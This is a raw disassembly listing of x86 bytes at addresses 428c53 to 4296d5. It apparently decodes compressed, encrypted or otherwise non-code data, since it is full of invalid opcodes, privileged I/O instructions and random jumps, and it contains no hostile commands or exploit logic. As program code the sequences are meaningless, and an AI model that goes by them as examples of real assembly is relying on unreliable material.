  428c53:	add    BYTE PTR [eax],al
  428c55:	add    ch,al
  428c57:	push   ebp
  428c58:	mov    bh,dl
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0xa1bdd8dc
  428c66:	addr16 mov ch,0x1
  428c69:	add    BYTE PTR [eax],al
  428c6b:	add    DWORD PTR [eax],eax
  428c6d:	add    BYTE PTR [esi-0x31b515a2],al
  428c73:	jb     0x428bfb
  428c75:	or     BYTE PTR [edi+0x76b57f7e],al
  428c7b:	leave  
  428c7c:	aas    
  428c7d:	test   eax,0x48152d4e
  428c82:	xor    al,0x2b
  428c84:	retf   
  428c85:	ja     0x428cc8
  428c87:	aad    0x8c
  428c89:	sub    DWORD PTR [esp+eax*8+0x608cea32],esp
  428c90:	mov    al,BYTE PTR [esi+0x631257cc]
  428c96:	xchg   ecx,eax
  428c97:	into   
  428c98:	into   
  428c99:	mov    ebx,0xa106f482
  428c9e:	cmc    
  428c9f:	ja     0x428c90
  428ca1:	mov    ebx,0x5e5c288c
  428ca6:	cli    
  428ca7:	pop    esp
  428ca8:	and    DWORD PTR ds:0x1c7147e0,eax
  428cae:	data16 imul BYTE PTR [ebx+0x79ec0540]
  428cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cb6:	pop    ds
  428cb7:	push   edx
  428cb9:	aas    
  428cba:	shr    BYTE PTR [edi],1
  428cbc:	mov    dl,0x2a
  428cbe:	loopne 0x428c9f
  428cc0:	sbb    ah,BYTE PTR [eax-0x6]
  428cc3:	xchg   DWORD PTR [esp+ebp*1],ebp
  428cc6:	daa    
  428cc7:	inc    esp
  428cc8:	or     BYTE PTR [ebp-0x4a],0x8a
  428ccc:	test   DWORD PTR [ebx-0x2fd9f028],ecx
  428cd2:	pop    es
  428cd3:	ins    BYTE PTR es:[edi],dx
  428cd4:	cdq    
  428cd5:	add    DWORD PTR [ecx],ecx
  428cd7:	mov    bh,0xe7
  428cd9:	repz lea esi,[edx]
  428cdc:	cdq    
  428cdd:	jbe    0x428cb5
  428cdf:	sub    dh,dl
  428ce1:	xchg   DWORD PTR [eax+ecx*8-0x7fac9b2a],ecx
  428ce8:	cmp    BYTE PTR [ebp-0x4f],bh
  428ceb:	ins    BYTE PTR es:[edi],dx
  428cec:	mov    ch,0x3b
  428cee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428cef:	jo     0x428c8b
  428cf1:	push   es
  428cf2:	jbe    0x428d68
  428cf4:	leave  
  428cf5:	not    BYTE PTR [edi-0x5c8bb351]
  428cfb:	lock inc esi
  428cfd:	mov    ecx,0x5763c7b0
  428d02:	dec    eax
  428d03:	popa   
  428d04:	mov    ecx,DWORD PTR [edi+0x3eaaabd6]
  428d0a:	jecxz  0x428d84
  428d0c:	dec    ecx
  428d0d:	sub    eax,0xf860d4ec
  428d12:	push   esp
  428d13:	test   al,0x96
  428d15:	cdq    
  428d16:	mov    esp,0xb4581007
  428d1b:	ret    0x2276
  428d1e:	mov    ebp,0x575d972b
  428d23:	jge    0x428d11
  428d25:	cwde   
  428d26:	aaa    
  428d27:	mov    edx,0xa2656cfc
  428d2c:	mov    ebp,0x8fc27950
  428d31:	inc    edx
  428d32:	inc    esi
  428d33:	jmp    0x9f03bf24
  428d38:	pop    edi
  428d39:	mov    bh,0x30
  428d3b:	cmp    al,ch
  428d3d:	shl    DWORD PTR [edx],0xa6
  428d40:	pop    ds
  428d41:	cmp    esp,eax
  428d43:	repnz adc DWORD PTR [eax-0x70],ebx
  428d47:	loopne 0x428d29
  428d49:	push   esi
  428d4a:	push   cs
  428d4b:	or     ch,0x40
  428d4e:	out    dx,eax
  428d4f:	mov    ah,0x60
  428d51:	mov    cl,0x86
  428d53:	inc    esi
  428d54:	ds inc esp
  428d56:	fdivr  st(0),st
  428d58:	cdq    
  428d59:	or     edi,DWORD PTR [edi+ebx*8-0x54]
  428d5d:	jmp    0x7637cfe9
  428d62:	xor    ebx,0xb1eaeb2e
  428d68:	test   al,0xef
  428d6a:	mov    dl,0xd0
  428d6c:	xchg   esi,eax
  428d6d:	push   ds
	...
  428dd6:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x102f
  428de4:	and    ah,0x67
  428de7:	mov    dh,0x1
  428de9:	add    BYTE PTR [eax],al
  428deb:	add    DWORD PTR [eax],eax
  428ded:	add    BYTE PTR [edi],ah
  428def:	xchg   ecx,eax
  428df0:	mov    ds:0xbc14c939,eax
  428df5:	rcl    BYTE PTR [ebx+0x1d],cl
  428df8:	jg     0x428d8a
  428dfa:	jae    0x428dd1
  428dfc:	adc    BYTE PTR [esi],bl
  428dfe:	rol    DWORD PTR [ebx+0x44],0x2f
  428e02:	add    eax,0x3a3192b8
  428e07:	lods   eax,DWORD PTR ds:[esi]
  428e08:	retf   0x964e
  428e0b:	pop    ebx
  428e0c:	push   ds
  428e0d:	dec    esi
  428e0e:	lods   al,BYTE PTR ds:[esi]
  428e0f:	pop    esp
  428e10:	jg     0x428e05
  428e12:	xchg   ebx,eax
  428e13:	das    
  428e14:	mov    gs,WORD PTR [esi+0x59]
  428e17:	loop   0x428e55
  428e19:	mov    fs,WORD PTR [ebx]
  428e1b:	(bad)  
  428e1c:	xor    eax,0x121e275f
  428e21:	mov    cl,0xc1
  428e23:	xchg   esi,eax
  428e24:	jl     0x428e37
  428e26:	push   esp
  428e27:	outs   dx,BYTE PTR ds:[esi]
  428e28:	test   eax,0x8801a174
  428e2d:	out    dx,al
  428e2e:	xchg   DWORD PTR [ecx-0xbf1f431],eax
  428e34:	setge  bh
  428e37:	pop    ecx
  428e38:	and    bl,bl
  428e3a:	imul   ebp,DWORD PTR [edx+edi*8+0x4],0xa8e2d1d9
  428e42:	dec    esp
  428e43:	inc    edx
  428e44:	dec    ebx
  428e45:	aaa    
  428e46:	mov    dh,0x1c
  428e48:	scas   eax,DWORD PTR es:[edi]
  428e49:	inc    eax
  428e4a:	popa   
  428e4b:	imul   edx,DWORD PTR [ecx+0x3f],0x37
  428e4f:	jmp    0xc45c0c74
  428e54:	mov    al,ds:0x9183bf3c
  428e59:	in     eax,dx
  428e5a:	mov    bl,0xd5
  428e5c:	dec    esi
  428e5d:	ficomp DWORD PTR [ecx+ecx*4+0x63]
  428e61:	out    dx,al
  428e62:	push   DWORD PTR [eax-0x3c]
  428e65:	pop    es
  428e66:	or     edi,ebx
  428e68:	lock stos BYTE PTR es:[edi],al
  428e6a:	mov    al,BYTE PTR [eax-0x76ae59f7]
  428e70:	mov    esp,0xcba35793
  428e75:	xor    BYTE PTR [eax-0x78efb347],cl
  428e7b:	adc    DWORD PTR [esi+0x1f508a46],esp
  428e81:	jmp    0x428ea4
  428e83:	add    cl,BYTE PTR [edx]
  428e85:	adc    BYTE PTR [ebx+edx*2-0x631d76c0],ch
  428e8c:	cmp    al,0xa5
  428e8e:	mov    edx,0xe31d3bf4
  428e93:	jns    0x428ee6
  428e95:	inc    edx
  428e96:	fst    QWORD PTR [eax-0xf]
  428e99:	xor    edx,ebx
  428e9b:	jb     0x428ea7
  428e9d:	arpl   cx,cx
  428e9f:	fwait
  428ea0:	dec    ebp
  428ea1:	call   DWORD PTR [ecx]
  428ea3:	mov    ah,0xd7
  428ea5:	addr16 ret 
  428ea7:	shl    DWORD PTR [edi+0x518ccf10],0x41
  428eae:	and    eax,0x1c1a522e
  428eb3:	pop    ds
  428eb4:	sbb    al,0x3b
  428eb6:	dec    ecx
  428eb7:	jg     0x428f34
  428eb9:	or     DWORD PTR [ecx+0x368ee165],edx
  428ebf:	pop    ecx
  428ec1:	jno    0x428f0f
  428ec3:	das    
  428ec4:	ins    DWORD PTR es:[edi],dx
  428ec5:	sbb    DWORD PTR [ebx-0x2c],eax
  428ec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ec9:	(bad)  
  428eca:	int    0xbb
  428ecc:	and    al,0x57
  428ece:	cmp    al,0xe2
  428ed0:	or     al,0x55
  428ed2:	mov    edi,DWORD PTR [eax]
  428ed4:	jl     0x428f2c
  428ed6:	nop
  428ed7:	sub    edi,DWORD PTR [ebp-0x48fd4a10]
  428edd:	sbb    DWORD PTR [esi],ecx
  428edf:	sub    eax,0x9f39d38
  428ee4:	(bad)  
  428ee5:	jg     0x428e78
  428ee7:	call   0xb784:0x4df0b79f
	...
  428f56:	dec    edi
  428f57:	pop    ebp
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0x6b
  428f63:	sub    BYTE PTR [esi],bh
  428f65:	cmp    DWORD PTR [edi-0x49],esp
  428f68:	add    DWORD PTR [eax],eax
  428f6a:	add    BYTE PTR [ecx],al
  428f6c:	add    BYTE PTR [eax],al
  428f6e:	(bad)  
  428f6f:	test   eax,0xc3fa5c2
  428f74:	fmul   st,st(3)
  428f76:	push   0x8b6d13ee
  428f7b:	push   esp
  428f7c:	stos   BYTE PTR es:[edi],al
  428f7d:	xor    ah,BYTE PTR [edi]
  428f7f:	fs mov ch,0xe
  428f82:	in     eax,0x41
  428f84:	ins    DWORD PTR es:[edi],dx
  428f85:	idiv   BYTE PTR [ebx]
  428f87:	sbb    dh,dl
  428f89:	or     BYTE PTR [esi+0x34],0x99
  428f8d:	dec    eax
  428f8e:	aad    0xa1
  428f90:	sbb    esi,DWORD PTR [edi]
  428f92:	ror    ah,1
  428f94:	sub    edi,DWORD PTR [edi-0x18]
  428f97:	or     eax,DWORD PTR [ebx]
  428f99:	add    eax,edi
  428f9b:	adc    eax,0x1295c16e
  428fa0:	cld    
  428fa1:	lahf   
  428fa2:	adc    al,0x6e
  428fa4:	mov    DWORD PTR [edi+ebp*1],esi
  428fa7:	popf   
  428fa8:	jo     0x429003
  428faa:	xor    DWORD PTR [edi+0x17],ebx
  428fad:	rol    ch,1
  428faf:	rcr    bl,1
  428fb1:	arpl   ax,bp
  428fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428fb4:	(bad)  
  428fb5:	sub    bl,BYTE PTR [edi]
  428fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fb8:	cmp    BYTE PTR [ecx+0x42],dh
  428fbb:	ins    BYTE PTR es:[edi],dx
  428fbc:	stc    
  428fbd:	imul   eax,eax,0x5cd9a79d
  428fc3:	dec    edx
  428fc4:	add    ebx,DWORD PTR [esp+edx*1+0x6532ddcf]
  428fcb:	shl    bl,cl
  428fcd:	nop
  428fce:	fs (bad) 
  428fd0:	pop    edi
  428fd1:	sar    DWORD PTR [ebp+0x27],0x40
  428fd5:	pop    esi
  428fd6:	jo     0x428fd9
  428fd8:	push   ecx
  428fd9:	push   eax
  428fda:	popf   
  428fdb:	sbb    al,0x4a
  428fdd:	sbb    dh,BYTE PTR [ecx]
  428fdf:	outs   dx,DWORD PTR ds:[esi]
  428fe0:	adc    edi,DWORD PTR [edi]
  428fe2:	xrelease xchg BYTE PTR [ecx],bl
  428fe5:	call   0xda3:0xff9c
  428feb:	sbb    DWORD PTR [eax+0x55cb0f36],esp
  428ff1:	mov    al,0xa7
  428ff3:	sub    BYTE PTR [esi+0x3d],ah
  428ff6:	dec    ebx
  428ff7:	das    
  428ff8:	push   cs
  428ff9:	das    
  428ffa:	inc    ebp
  428ffb:	jbe    0x428fc5
  428ffd:	mov    ch,0xe5
  428fff:	mov    bl,0xc3
  429001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429002:	push   es
  429003:	sub    edx,DWORD PTR [ebp-0x53ac9c8c]
  429009:	inc    ebp
  42900a:	les    edi,FWORD PTR [ebx]
  42900c:	push   ds
  42900d:	std    
  42900e:	pop    esi
  42900f:	xor    eax,DWORD PTR [ebx*2-0x63756b96]
  429016:	out    0xc9,al
  429018:	ins    BYTE PTR es:[edi],dx
  429019:	cmp    BYTE PTR [edx+edi*2-0x27514dfe],al
  429020:	nop
  429021:	cmc    
  429022:	into   
  429023:	or     cl,ah
  429025:	push   0x9b13464d
  42902a:	adc    BYTE PTR [ebx],bl
  42902c:	in     eax,dx
  42902d:	imul   eax,esp,0xf3706ff5
  429033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429034:	in     al,dx
  429035:	push   esi
  429036:	rcl    BYTE PTR [ecx+0x206e239],0x1f
  42903d:	lahf   
  42903e:	push   ss
  42903f:	and    ebp,ebp
  429041:	jle    0x428fc3
  429043:	inc    edx
  429044:	(bad)  [esi]
  429046:	inc    ebx
  429047:	ret    0xaa57
  42904a:	pop    esp
  42904b:	mov    ebx,0x645fa6f8
  429050:	neg    BYTE PTR [edi-0xe]
  429053:	ror    BYTE PTR [ebx+0x2290822],0x3e
  42905a:	jmp    0x429027
  42905c:	push   ds
  42905d:	in     eax,0x1e
  42905f:	xchg   DWORD PTR [edi+0x758f6646],edx
  429065:	jecxz  0x429017
  429067:	push   0xe7b269c1
  42906c:	inc    edi
  42906d:	cmc    
	...
  4290d6:	loope  0x4290c4
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0x4bfc7b77
  4290e3:	in     eax,0x8c
  4290e5:	nop
  4290e6:	addr16 mov eax,0x1000001
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	bswap  esi
  4290f0:	adc    ecx,ebp
  4290f2:	je     0x42909a
  4290f4:	cmp    eax,0xc493cc5b
  4290f9:	(bad)  
  4290fa:	cmp    ecx,DWORD PTR [ebp+0x3e0abc74]
  429100:	ja     0x4290b1
  429102:	shl    DWORD PTR [ecx],0x97
  429105:	cwde   
  429106:	jp     0x429138
  429108:	mov    edi,0xd16ae7f7
  42910d:	les    edi,FWORD PTR [edi-0x5]
  429110:	inc    ebx
  429111:	fdivr  QWORD PTR ds:0xaea8eb55
  429117:	fsubrp st(2),st
  429119:	dec    ebp
  42911a:	in     al,0x2c
  42911c:	retf   
  42911d:	xchg   edi,eax
  42911e:	ins    BYTE PTR es:[edi],dx
  42911f:	imul   edx,eax,0x92207d3c
  429125:	retf   0x7746
  429128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429129:	dec    eax
  42912a:	aam    0x51
  42912c:	add    edi,ebx
  42912e:	push   ds
  42912f:	addr16 aaa 
  429131:	inc    edx
  429132:	xchg   ebx,eax
  429133:	cmp    esp,ebx
  429135:	pop    ebp
  429136:	xor    ecx,eax
  429138:	gs add ebp,esp
  42913b:	push   0x6a
  42913d:	add    bl,ah
  42913f:	jl     0x4290d7
  429141:	dec    esp
  429142:	shr    DWORD PTR [edx-0x4a],cl
  429145:	sbb    cl,BYTE PTR [ebx+0x58]
  429148:	xor    eax,0x94e0da1e
  42914d:	or     bl,BYTE PTR [ebp+eiz*8+0x50]
  429151:	lds    ebp,FWORD PTR [ecx-0x3f3990ea]
  429157:	in     eax,dx
  429158:	inc    esi
  429159:	push   ebp
  42915a:	and    eax,0x3d40c596
  42915f:	xchg   edi,eax
  429160:	xchg   ecx,eax
  429161:	pop    eax
  429162:	adc    BYTE PTR [edx-0x28a6e094],bh
  429168:	sub    eax,0x8c8ca73b
  42916d:	test   al,0x1b
  42916f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429170:	imul   edi,esp,0x337d632e
  429176:	aam    0xe7
  429178:	mov    dl,0x42
  42917a:	cwde   
  42917b:	scas   eax,DWORD PTR es:[edi]
  42917c:	test   al,0xec
  42917e:	cmc    
  42917f:	pop    edi
  429180:	pop    ecx
  429181:	test   eax,0x8a3b173a
  429186:	in     al,0x90
  429188:	ret    
  429189:	cmp    DWORD PTR [eax-0x18],edi
  42918c:	enter  0xbba1,0xbe
  429190:	data16 out dx,al
  429192:	fsubr  DWORD PTR [ebx]
  429194:	fcomp  DWORD PTR [ecx-0x5e]
  429197:	mov    cl,0x3b
  429199:	cdq    
  42919a:	mov    WORD PTR [eax],ds
  42919c:	push   ebx
  42919d:	aad    0x8c
  42919f:	lds    edi,FWORD PTR [edx+0x13]
  4291a2:	icebp  
  4291a3:	cmp    BYTE PTR [edi-0x56],bh
  4291a6:	neg    BYTE PTR [eax]
  4291a8:	inc    ebx
  4291a9:	stos   DWORD PTR es:[edi],eax
  4291aa:	loop   0x4291ea
  4291ac:	mov    edi,0x71ecc86c
  4291b1:	test   eax,0x4688cbe5
  4291b6:	and    ch,BYTE PTR [ebp-0x47]
  4291b9:	or     dl,cl
  4291bb:	pop    es
  4291bc:	leave  
  4291bd:	and    DWORD PTR [eax+esi*8+0x63],edx
  4291c1:	lods   eax,DWORD PTR ds:[esi]
  4291c2:	mov    ds:0x62e376a5,al
  4291c7:	pop    esp
  4291c8:	fist   DWORD PTR [ecx-0x5a]
  4291cb:	mov    ds:0xcfea0209,al
  4291d0:	xor    eax,0x8e3dcc3e
  4291d5:	cld    
  4291d6:	inc    esp
  4291d7:	cs cmc 
  4291d9:	jae    0x4291d5
  4291db:	xlat   BYTE PTR ds:[ebx]
  4291dc:	jl     0x429251
  4291de:	clc    
  4291df:	and    ch,0x7f
  4291e2:	int3   
  4291e3:	xchg   esp,eax
  4291e4:	popa   
  4291e5:	dec    edx
  4291e6:	inc    ebp
  4291e7:	sbb    eax,0x4285ef8e
  4291ec:	mov    ds:0x52,al
	...
  429255:	add    BYTE PTR [esi-0x79],dl
  429258:	std    
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [esp+edi*1+0x6753d8be],0x1b9
  42926b:	add    DWORD PTR [eax],eax
  42926d:	add    BYTE PTR [edx-0x1dfdae10],ch
  429273:	out    dx,al
  429274:	inc    ebx
  429275:	mov    ah,0x16
  429277:	ss or  dh,bh
  42927a:	mov    ebp,0x9d956fbd
  42927f:	gs out 0xce,al
  429282:	push   ebp
  429283:	(bad)  
  429284:	adc    eax,0x363e85a7
  429289:	(bad)  
  42928a:	cmc    
  42928b:	mov    ebp,0x897cb569
  429290:	std    
  429291:	cmc    
  429292:	out    0x53,ax
  429295:	mov    eax,0xc3ae7a4f
  42929a:	mov    ch,0xe1
  42929c:	cmp    al,0xe1
  42929e:	out    dx,al
  42929f:	jb     0x429251
  4292a1:	je     0x42931b
  4292a3:	test   al,0x6c
  4292a5:	ins    BYTE PTR es:[edi],dx
  4292a6:	retf   0x92bb
  4292a9:	push   ebx
  4292aa:	and    BYTE PTR [ecx+0x39],bh
  4292ad:	dec    ebp
  4292ae:	shl    DWORD PTR ds:0x1ad9d987,0xd8
  4292b5:	and    eax,0x78c91485
  4292ba:	cs dec ebx
  4292bc:	add    ebx,ebp
  4292be:	popf   
  4292bf:	add    eax,0x82076e1d
  4292c4:	and    eax,0xa2dee4ad
  4292c9:	and    DWORD PTR [ebx-0x42],ebp
  4292cc:	scas   al,BYTE PTR es:[edi]
  4292cd:	fild   WORD PTR [edi]
  4292cf:	xchg   esp,eax
  4292d0:	ja     0x42925f
  4292d2:	out    0x11,al
  4292d4:	lods   al,BYTE PTR ds:[esi]
  4292d5:	in     al,0xf6
  4292d7:	mov    dh,0x5c
  4292d9:	push   ebp
  4292da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292db:	dec    esi
  4292dc:	mov    ebp,DWORD PTR [ebp+0x16]
  4292df:	fisttp DWORD PTR [edx]
  4292e1:	into   
  4292e2:	and    BYTE PTR ds:0x6b7eb8ec,0xe
  4292e9:	mov    ds:0x70055d39,al
  4292ee:	loop   0x4292ec
  4292f0:	jg     0x42935a
  4292f2:	addr16 adc al,0x89
  4292f5:	mov    DWORD PTR [ecx+0xd],eax
  4292f8:	xchg   esi,eax
  4292f9:	adc    eax,0x75e50c3
  4292fe:	push   esp
  4292ff:	ins    BYTE PTR es:[edi],dx
  429300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429301:	xor    eax,DWORD PTR [edx-0x7]
  429304:	stos   DWORD PTR es:[edi],eax
  429305:	jae    0x429287
  429307:	shl    BYTE PTR [ecx+0x7c],1
  42930a:	adc    eax,0x2052eee
  42930f:	inc    BYTE PTR [edi+0x43]
  429312:	adc    ebx,esp
  429314:	cmp    eax,0xbdf96eb9
  429319:	sbb    ah,BYTE PTR [edi]
  42931b:	enter  0x44bf,0x89
  42931f:	dec    edx
  429320:	jmp    0x97dc7e0f
  429325:	aam    0xea
  429327:	xchg   BYTE PTR [eax-0x1afbddca],dl
  42932d:	popa   
  42932e:	push   ss
  42932f:	call   FWORD PTR [edi+0x5b]
  429332:	out    0x3f,al
  429334:	test   eax,0xe24bbdc5
  429339:	shl    BYTE PTR [ecx],0x7d
  42933c:	push   0xffffffeb
  42933e:	mov    WORD PTR [ebx+0x7219c79f],?
  429344:	dec    ecx
  429345:	sub    al,dl
  429347:	push   ebp
  429348:	jo     0x4293be
  42934a:	add    DWORD PTR [ecx+0x3df0f726],ebp
  429350:	addr16 test al,0x1
  429353:	or     dh,bh
  429355:	add    al,0x8e
  429357:	and    eax,0xb8c89b13
  42935c:	mov    ebx,esp
  42935e:	adc    eax,ecx
  429360:	stos   BYTE PTR es:[edi],al
  429361:	out    0x16,eax
  429363:	iret   
  429364:	pop    es
  429365:	or     DWORD PTR [ebx-0x4c5516fe],edi
  42936b:	aas    
  42936c:	cdq    
  42936d:	cmp    BYTE PTR [eax],al
	...
  4293d3:	add    BYTE PTR [eax],al
  4293d5:	add    al,dh
  4293d7:	adc    al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0xa7
  4293e3:	dec    edi
  4293e4:	xchg   dl,ch
  4293e6:	addr16 mov edx,0x1000001
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	shr    DWORD PTR [bp+0x167e],1
  4293f3:	out    dx,al
  4293f4:	pop    ds
  4293f5:	lock into 
  4293f7:	imul   ebp,DWORD PTR [eax+0x7f526ab5],0x6a927b4
  429401:	scas   al,BYTE PTR es:[edi]
  429402:	jecxz  0x429393
  429404:	pop    edx
  429405:	into   
  429406:	enter  0xc,0x72
  42940a:	or     DWORD PTR [eax+0x50],ebp
  42940d:	xchg   esi,eax
  42940e:	scas   al,BYTE PTR es:[edi]
  42940f:	add    dh,BYTE PTR [ebp+0x50]
  429412:	lahf   
  429413:	pop    esi
  429414:	xlat   BYTE PTR ds:[ebx]
  429415:	xchg   BYTE PTR [ecx-0x37],ah
  429418:	pusha  
  429419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42941a:	test   BYTE PTR [edi-0x36889bce],al
  429420:	sbb    BYTE PTR ds:0x1424b9bb,bh
  429426:	mov    WORD PTR [edi-0x456a8e04],es
  42942c:	and    al,0x5e
  42942e:	push   0x3
  429430:	jecxz  0x429426
  429432:	or     al,0xec
  429434:	int    0xa1
  429436:	pop    esi
  429437:	iret   
  429438:	sti    
  429439:	cmp    eax,0x6bb55ed1
  42943e:	popf   
  42943f:	ret    0x773e
  429442:	ret    
  429443:	jns    0x429409
  429445:	mov    edx,0x72814439
  42944a:	sbb    DWORD PTR [edx-0x314d8436],0x33472f65
  429454:	ja     0x429429
  429456:	adc    DWORD PTR [edi-0x4720ad74],ebx
  42945c:	push   eax
  42945d:	pop    esi
  42945e:	jecxz  0x429434
  429460:	iret   
  429461:	ins    DWORD PTR es:[edi],dx
  429462:	jno    0x429441
  429464:	dec    ecx
  429465:	push   ds
  429466:	rcl    BYTE PTR [eax],1
  429468:	repz pop eax
  42946a:	repnz jecxz 0x4293f8
  42946d:	lods   al,BYTE PTR ds:[esi]
  42946e:	jae    0x429479
  429470:	or     eax,0xe081bc91
  429475:	cmp    edx,0x3124b3f1
  42947b:	pop    edi
  42947c:	test   BYTE PTR [edx+0x9],ah
  42947f:	mov    esi,0xd28e2d05
  429484:	jno    0x4294b5
  429486:	adc    eax,0x76a0bd23
  42948b:	fsubp  st(5),st
  42948d:	adc    BYTE PTR [eax+0x1c4d08e0],bh
  429493:	mul    BYTE PTR [eax]
  429495:	ret    
  429496:	pop    ds
  429497:	xor    al,0xc0
  429499:	das    
  42949a:	fs cdq 
  42949c:	jnp    0x42948d
  42949e:	popf   
  42949f:	lock fwait
  4294a1:	or     esi,0x69
  4294a4:	xchg   ebx,eax
  4294a5:	push   cs
  4294a6:	mov    WORD PTR [ecx-0x64f193d],es
  4294ac:	jge    0x4294b0
  4294ae:	sbb    al,0xf2
  4294b0:	and    eax,0xb070e7cf
  4294b5:	or     dh,bl
  4294b7:	add    BYTE PTR [ebp-0x6d8c119a],dl
  4294bd:	dec    edi
  4294be:	loopne 0x429448
  4294c0:	push   esi
  4294c1:	(bad)  
  4294c2:	(bad)  ds:0x598751a3
  4294c8:	add    BYTE PTR [ebx],al
  4294ca:	or     DWORD PTR [edx-0xd],esi
  4294cd:	sub    BYTE PTR [ebx-0x47],dl
  4294d0:	mov    ecx,0xbe94c668
  4294d5:	ja     0x42946a
  4294d7:	adc    esi,DWORD PTR [eax+eax*8-0x9eeda1f]
  4294de:	(bad)  
  4294df:	shl    esi,cl
  4294e1:	sbb    DWORD PTR [edi],eax
  4294e3:	es gs push 0xac3d6afd
  4294ea:	pop    esi
  4294eb:	or     eax,0xdb9f
	...
  429554:	add    BYTE PTR [eax],al
  429556:	dec    esp
  429557:	or     eax,0x3e532c13
  42955c:	jg     0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp-0x19a8be16],dx
  429565:	hlt    
  429566:	addr16 mov ebx,0x1000001
  42956c:	add    BYTE PTR [eax],al
  42956e:	data16 fidivr WORD PTR [ecx-0x51]
  429572:	stos   DWORD PTR es:[edi],eax
  429573:	mov    edi,0xf135b26e
  429578:	push   ebp
  429579:	out    0xdf,al
  42957b:	mov    ebp,0x2c76c58a
  429580:	push   ds
  429581:	outs   dx,BYTE PTR ds:[esi]
  429582:	inc    ebx
  429583:	sbb    ah,dl
  429585:	pop    es
  429586:	lahf   
  429587:	inc    edi
  429588:	push   cs
  429589:	test   BYTE PTR [edi+0x4d221c0],dh
  42958f:	adc    BYTE PTR [ecx],cl
  429591:	iret   
  429592:	lods   al,BYTE PTR ds:[esi]
  429593:	jo     0x429516
  429595:	int    0xdf
  429597:	test   al,0xcc
  429599:	test   BYTE PTR [ebp-0x44],cl
  42959c:	sub    BYTE PTR [ebp-0x6a],ah
  42959f:	push   esp
  4295a0:	inc    edx
  4295a1:	fsub   DWORD PTR [ebp-0x61]
  4295a4:	jb     0x42958f
  4295a6:	mov    bl,0xb5
  4295a8:	aad    0x2e
  4295aa:	push   cs
  4295ab:	cmp    DWORD PTR [ebp-0x2a],ebp
  4295ae:	sbb    ecx,DWORD PTR [ebp+edi*1+0x362c3bd1]
  4295b5:	cwde   
  4295b6:	shl    DWORD PTR [ebx],1
  4295b8:	rcr    BYTE PTR [edx+0x14],1
  4295bb:	adc    al,0x26
  4295bd:	ins    DWORD PTR es:[edi],dx
  4295be:	dec    esp
  4295bf:	bound  eax,QWORD PTR [ebx]
  4295c1:	ins    DWORD PTR es:[edi],dx
  4295c2:	dec    esi
  4295c3:	ins    DWORD PTR es:[edi],dx
  4295c4:	jne    0x42962d
  4295c6:	lods   al,BYTE PTR ds:[esi]
  4295c7:	sbb    ebx,esi
  4295c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295ca:	int    0x5c
  4295cc:	sub    ah,BYTE PTR [edx+0x4d]
  4295cf:	out    0xba,al
  4295d1:	aam    0xc8
  4295d3:	xchg   ebx,eax
  4295d4:	mov    gs,WORD PTR [ecx-0x762702dc]
  4295da:	push   edi
  4295db:	cmp    DWORD PTR [ebp+0x61],esp
  4295de:	mov    ch,0x61
  4295e0:	retf   
  4295e1:	push   cs
  4295e2:	or     DWORD PTR [esp+ebp*2+0x9211fd4],esp
  4295e9:	xor    esp,DWORD PTR [ebp-0x442c8112]
  4295ef:	jmp    0x4295b0
  4295f1:	xor    DWORD PTR [ecx-0x3ca2999b],esp
  4295f7:	sbb    DWORD PTR [ecx+0x55d8d199],0x23e19444
  429601:	cmp    DWORD PTR [eax],eax
  429603:	gs sti 
  429605:	sbb    BYTE PTR [ebx-0x3dd7866c],ah
  42960b:	fs pop es
  42960d:	add    ch,BYTE PTR [edi+0x5ae5520b]
  429613:	dec    ecx
  429614:	add    ebp,ebx
  429616:	adc    ebx,ecx
  429618:	loop   0x429676
  42961a:	pop    ebx
  42961b:	psubsw mm5,QWORD PTR [ecx-0x5a1bb7d6]
  429622:	fdiv   st(1),st
  429624:	or     BYTE PTR ds:0x81bc882,bh
  42962a:	aad    0x99
  42962c:	xor    DWORD PTR [ecx],0x2b7a058
  429632:	add    DWORD PTR [edi-0x8],edi
  429635:	into   
  429636:	add    BYTE PTR [ecx],0x68
  429639:	cmp    DWORD PTR [edi],0x945c27b0
  42963f:	test   dl,ch
  429641:	mov    ah,0x2
  429643:	clc    
  429644:	add    eax,DWORD PTR [edi+0x7]
  429647:	cld    
  429648:	add    al,al
  42964a:	in     al,dx
  42964b:	push   0x5c929f03
  429650:	out    0xfa,al
  429652:	xlat   BYTE PTR ds:[ebx]
  429653:	(bad)  
  429654:	and    ebx,edx
  429656:	call   0xbffc130a
  42965b:	shl    DWORD PTR [edi],0x4
  42965e:	xlat   BYTE PTR ds:[ebx]
  42965f:	repz pop esp
  429661:	mov    edi,0xc4df5c6a
  429666:	shl    DWORD PTR ds:0x1e97848d,1
  42966c:	ret    
  42966d:	sbb    al,BYTE PTR [eax]
	...
  4296d3:	add    BYTE PTR [eax],al
  4296d5:	add    BYTE PTR [ebp+0x1d],ch
